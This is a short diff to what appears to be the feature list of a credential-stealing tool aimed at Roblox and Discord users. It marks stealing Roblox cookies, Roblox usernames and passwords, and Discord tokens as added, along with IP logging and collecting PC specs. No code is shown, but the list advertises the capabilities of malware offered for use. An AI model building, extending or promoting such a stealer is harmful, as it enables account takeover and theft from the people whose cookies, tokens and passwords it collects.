@@ -15,8 +15,9 @@
 
 - `Roblox Cookie`🟢
 - `Roblox User name and pass`🟢
-- `Ip logger`🟡
-- `Discord token`🔴
+- `Ip logger`🟢
+- `Discord token`🟢
+- `Pc spect`🟢
 
 
 🟢 = Added  | 🟡 = To Do  | 🔴 = Not Adding
